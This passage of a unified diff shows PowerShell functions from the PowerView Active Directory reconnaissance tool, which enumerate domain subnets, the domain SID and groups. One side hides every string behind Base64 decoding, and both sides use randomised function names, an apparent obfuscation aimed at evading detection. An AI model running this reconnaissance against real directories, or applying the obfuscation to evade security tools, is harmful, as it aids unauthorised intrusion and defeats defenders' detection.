+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
                     catch {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
+                        $IdentityFilter += "(name=$IdentityInstance)"
                     }
                 }
             }
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVy")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
 
-            $SubnetSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9c3VibmV0KSRGaWx0ZXIp")))
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIEdldC1Eb21haW5TdWJuZXQgZmlsdGVyIHN0cmluZzogezB9"))) -f $($SubnetSearcher.filter))
+            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
+            Write-Verbose ("[Get-DomainSubnet] Get-DomainSubnet filter string: {0}" -f $($SubnetSearcher.filter))
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $SubnetSearcher.FindOne() }
+            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
             else { $Results = $SubnetSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                if ($PSBoundParameters['Raw']) {
                     
                     $Subnet = $_
                 }
                 else {
-                    $Subnet = hfjsvm -Properties $_.Properties
+                    $Subnet = tsuvgg -Properties $_.Properties
                 }
-                $Subnet.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlN1Ym5ldA=="))))
+                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))]) {
+                if ($PSBoundParameters['SiteName']) {
                     
                     
-                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KiRTaXRlTmFtZSo="))))) {
+                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                         $Subnet
                     }
-                    elseif ($Subnet.siteobject -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KiRTaXRlTmFtZSo=")))) {
+                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                         $Subnet
                     }
                 }
@@ -5892,7 +5896,7 @@ function ulaltl {
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TdWJuZXRdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6IHswfQ=="))) -f $_)
+                    Write-Verbose ("[Get-DomainSubnet] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $SubnetSearcher.dispose()
@@ -5901,7 +5905,7 @@ function ulaltl {
 }
 
 
-function elvzov {
+function fkynsl {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5923,24 +5927,24 @@ function elvzov {
     )
 
     $SearcherArguments = @{
-        'LDAPFilter' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKQ==")))
+        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
     }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-    $DCSID = aglnim @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
+    $DCSID = auxvef @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid
 
     if ($DCSID) {
-        $DCSID.SubString(0, $DCSID.LastIndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LQ==")))))
+        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
     }
     else {
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5TSURdIEVycm9yIGV4dHJhY3RpbmcgZG9tYWluIFNJRCBmb3IgJyREb21haW4=")))
+        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
     }
 }
 
 
-function pvupkd {
+function xcrlsg {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5995,7 +5999,7 @@ function pvupkd {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -6026,49 +6030,49 @@ function pvupkd {
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $GroupSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $GroupSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
         if ($GroupSearcher) {
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWVtYmVySWRlbnRpdHk=")))]) {
+            if ($PSBoundParameters['MemberIdentity']) {
 
-                if ($SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) {
-                    $OldProperties = $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]
+                if ($SearcherArguments['Properties']) {
+                    $OldProperties = $SearcherArguments['Properties']
                 }
 
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $MemberIdentity
-                $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
+                $SearcherArguments['Identity'] = $MemberIdentity
+                $SearcherArguments['Raw'] = $True
 
-                kzvwpf @SearcherArguments | ForEach-Object {
+                guawbd @SearcherArguments | ForEach-Object {
                     
                     $ObjectDirectoryEntry = $_.GetDirectoryEntry()
 
                     
-                    $ObjectDirectoryEntry.RefreshCache(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dG9rZW5Hcm91cHM="))))
+                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')
 
                     $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                         
                         $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
 
                         
-                        if ($GroupSid -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS01LTMyLS4q")))) {
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $GroupSid
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $False
-                            if ($OldProperties) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $OldProperties }
-                            $Group = kzvwpf @SearcherArguments
+                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
+                            $SearcherArguments['Identity'] = $GroupSid
+                            $SearcherArguments['Raw'] = $False
+                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
+                            $Group = guawbd @SearcherArguments
                             if ($Group) {
-                                $Group.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3Vw"))))
+                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                 $Group
                             }
                         }
@@ -6079,99 +6083,99 @@ function pvupkd {
                 $IdentityFilter = ''
                 $Filter = ''
                 $Identity | Where-Object {$_} | ForEach-Object {
-                    $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                    if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match '^S-1-') {
+                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                     }
-                    elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                        if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                    elseif ($IdentityInstance -match '^CN=') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                             
                             
-                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                            $GroupSearcher = ltdynu @SearcherArguments
+                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                            Write-Verbose "[Get-DomainGroup] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                            $SearcherArguments['Domain'] = $IdentityDomain
+                            $GroupSearcher = vydvzz @SearcherArguments
                             if (-not $GroupSearcher) {
-                                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
+                                Write-Warning "[Get-DomainGroup] Unable to retrieve domain searcher for '$IdentityDomain'"
                             }
                         }
                     }
-                    elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
-                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                        $IdentityFilter += "(objectguid=$GuidByteString)"
                     }
-                    elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
-                        $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | vqxllx -OutputType Canonical
+                    elseif ($IdentityInstance.Contains('\')) {
+                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | jjxazw -OutputType Canonical
                         if ($ConvertedIdentityInstance) {
-                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
-                            $GroupName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
-                            $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRHcm91cE5hbWUp")))
-                            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $GroupDomain
-                            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gRXh0cmFjdGVkIGRvbWFpbiAnJEdyb3VwRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
-                            $GroupSearcher = ltdynu @SearcherArguments
+                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                            $GroupName = $IdentityInstance.Split('\')[1]
+                            $IdentityFilter += "(samAccountName=$GroupName)"
+                            $SearcherArguments['Domain'] = $GroupDomain
+                            Write-Verbose "[Get-DomainGroup] Extracted domain '$GroupDomain' from '$IdentityInstance'"
+                            $GroupSearcher = vydvzz @SearcherArguments
                         }
                     }
                     else {
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKQ==")))
+                        $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
                     }
                 }
 
                 if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                    $Filter += "(|$IdentityFilter)"
                 }
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))]) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBhZG1pbkNvdW50PTE=")))
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGFkbWluY291bnQ9MSk=")))
+                if ($PSBoundParameters['AdminCount']) {
+                    Write-Verbose '[Get-DomainGroup] Searching for adminCount=1'
+                    $Filter += '(admincount=1)'
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTY29wZQ==")))]) {
-                    $GroupScopeValue = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBTY29wZQ==")))]
+                if ($PSBoundParameters['GroupScope']) {
+                    $GroupScopeValue = $PSBoundParameters['GroupScope']
                     $Filter = Switch ($GroupScopeValue) {
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluTG9jYWw=")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj00KQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90RG9tYWluTG9jYWw=")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTQpKQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2xvYmFs")))            { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yKQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90R2xvYmFs")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIpKQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5pdmVyc2Fs")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04KQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90VW5pdmVyc2Fs")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTgpKQ=="))) }
+                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
+                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
+                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
+                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
+                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
+                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                     }
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBncm91cCBzY29wZSAnJEdyb3VwU2NvcGVWYWx1ZQ==")))
+                    Write-Verbose "[Get-DomainGroup] Searching for group scope '$GroupScopeValue'"
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBQcm9wZXJ0eQ==")))]) {
-                    $GroupPropertyValue = $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R3JvdXBQcm9wZXJ0eQ==")))]
+                if ($PSBoundParameters['GroupProperty']) {
+                    $GroupPropertyValue = $PSBoundParameters['GroupProperty']
                     $Filter = Switch ($GroupPropertyValue) {
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHk=")))              { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0yMTQ3NDgzNjQ4KQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzdHJpYnV0aW9u")))          { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTIxNDc0ODM2NDgpKQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRlZEJ5U3lzdGVt")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdyb3VwVHlwZToxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xKQ=="))) }
-                        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm90Q3JlYXRlZEJ5U3lzdGVt")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEoZ3JvdXBUeXBlOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEpKQ=="))) }
+                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
+                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
+                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
+                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                     }
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gU2VhcmNoaW5nIGZvciBncm91cCBwcm9wZXJ0eSAnJEdyb3VwUHJvcGVydHlWYWx1ZQ==")))
+                    Write-Verbose "[Get-DomainGroup] Searching for group property '$GroupPropertyValue'"
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+                if ($PSBoundParameters['LDAPFilter']) {
+                    Write-Verbose "[Get-DomainGroup] Using additional LDAP filter: $LDAPFilter"
+                    $Filter += "$LDAPFilter"
                 }
 
-                $GroupSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXApJEZpbHRlcik=")))
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gZmlsdGVyIHN0cmluZzogezB9"))) -f $($GroupSearcher.filter))
+                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
+                Write-Verbose ("[Get-DomainGroup] filter string: {0}" -f $($GroupSearcher.filter))
 
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $GroupSearcher.FindOne() }
+                if ($PSBoundParameters['FindOne']) { $Results = $GroupSearcher.FindOne() }
                 else { $Results = $GroupSearcher.FindAll() }
                 $Results | Where-Object {$_} | ForEach-Object {
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                    if ($PSBoundParameters['Raw']) {
                         
                         $Group = $_
                     }
                     else {
-                        $Group = hfjsvm -Properties $_.Properties
+                        $Group = tsuvgg -Properties $_.Properties
                     }
-                    $Group.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkdyb3Vw"))))
+                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                     $Group
                 }
                 if ($Results) {
                     try { $Results.dispose() }
                     catch {
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Hcm91cF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdA==")))
+                        Write-Verbose "[Get-DomainGroup] Error disposing of the Results object"
                     }
                 }
                 $GroupSearcher.dispose()
@@ -6181,7 +6185,7 @@ function pvupkd {
 }
 
 
-function vehehs {
+function rctzwj {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
